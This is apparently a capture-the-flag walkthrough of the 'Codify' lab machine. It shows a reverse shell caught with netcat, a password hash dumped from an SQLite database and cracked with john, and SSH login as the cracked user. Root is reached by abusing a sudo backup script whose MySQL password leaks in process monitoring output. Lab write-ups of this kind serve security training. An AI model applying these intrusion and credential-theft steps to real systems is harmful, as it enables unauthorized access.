![[Pasted image 20231119201933.png]]

https://github.com/7h3h4ckv157/CVE-2023-37903


![[Pasted image 20231119202624.png]]

```
kali@kali ~> nc -nvlp 444
listening on [any] 444 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.239] 35660
bash: cannot set terminal process group (1251): Inappropriate ioctl for device
bash: no job control in this shell
svc@codify:~$ dir
linpeas.sh  mal.sh  scan
svc@codify:~$ cd /var
svc@codify:/var$ cd www
svc@codify:/var/www$ dir   
contact  editor  html
svc@codify:/var/www$ cd html
svc@codify:/var/www/html$ dir  
index.html
svc@codify:/var/www/html$ cd ..
svc@codify:/var/www$ cd contact
svc@codify:/var/www/contact$ dir
index.js  package.json	package-lock.json  templates  tickets.db
svc@codify:/var/www/contact$ file tickets.db
file tickets.db
tickets.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 17, database pages 5, cookie 0x2, schema 4, UTF-8, version-valid-for 17
```


```
kali@kali ~> strings tickets.db 
SQLite format 3
otableticketstickets
CREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P
Ytablesqlite_sequencesqlite_sequence
CREATE TABLE sqlite_sequence(name,seq)
	tableusersusers
CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        username TEXT UNIQUE, 
        password TEXT
    ))
indexsqlite_autoindex_users_1users
joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
joshua
users
tickets
Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open
Tom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!open
```

```
kali@kali ~> cat hashes.txt
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
kali@kali ~> john --show hashes.txt
?:spongebob1

1 password hash cracked, 0 left
kali@kali ~> joshua:spongebob1

```

```
kali@kali ~> ssh joshua@codify.htb
joshua@codify.htb's password: spongebob1
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Nov 19 05:49:41 PM UTC 2023

  System load:                      0.03564453125
  Usage of /:                       70.2% of 6.50GB
  Memory usage:                     30%
  Swap usage:                       0%
  Processes:                        239
  Users logged in:                  1
  IPv4 address for br-030a38808dbf: 172.18.0.1
  IPv4 address for br-5ab86a4e40d0: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.239
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:aee9


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Nov 19 17:01:28 2023 from 10.10.14.6
joshua@codify:~$ 


```

```
joshua@codify:~$ sudo -l
[sudo] password for joshua: spongebob1
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

```
joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'

```


```
joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root: 
Password confirmation failed!
joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root: 
Password confirmation failed!
joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root: 
Password confirmed!
mysql: [Warning] Using a password on the command line interface can be insecure.
Backing up database: mysql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
Backing up database: sys
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
All databases backed up successfully!
Changing the permissions
Done!

```

```
2023/11/19 17:01:52 CMD: UID=0     PID=1      | /sbin/init 
2023/11/19 17:02:00 CMD: UID=1000  PID=120828 | -bash 
2023/11/19 17:02:06 CMD: UID=0     PID=120829 | sudo /opt/scripts/mysql-backup.sh 
2023/11/19 17:02:06 CMD: UID=0     PID=120830 | /bin/bash /opt/scripts/mysql-backup.sh 
2023/11/19 17:02:06 CMD: UID=0     PID=120831 | /usr/bin/cat /root/.creds 
2023/11/19 17:02:09 CMD: UID=0     PID=120832 | /bin/bash /opt/scripts/mysql-backup.sh 
2023/11/19 17:02:09 CMD: UID=0     PID=120833 | 
2023/11/19 17:02:09 CMD: UID=0     PID=120837 | /usr/bin/grep -Ev (Database|information_schema|performance_schema) 
2023/11/19 17:02:09 CMD: UID=0     PID=120836 | /usr/bin/mysql -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 -e SHOW DATABASES; 
2023/11/19 17:02:09 CMD: UID=0     PID=120835 | /bin/bash /opt/scripts/mysql-backup.sh 
2023/11/19 17:02:09 CMD: UID=0     PID=120839 | /usr/bin/echo Backing up database: mysql 
2023/11/19 17:02:09 CMD: UID=0     PID=120841 | /bin/bash /opt/scripts/mysql-backup.sh 
2023/11/19 17:02:09 CMD: UID=0     PID=120840 | /usr/bin/mysqldump --force -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 mysql 
```

```
joshua@codify:~$ sudo su
Sorry, user joshua is not allowed to execute '/usr/bin/su' as root on codify.
joshua@codify:~$ su 
Password: kljh12k3jhaskjh12kjh3
root@codify:/home/joshua# cd
root@codify:~# cd /root
root@codify:~# dir
root.txt  scripts
root@codify:~# cat root.txt
bbc1a6913adc570c7c3a07131345f715

```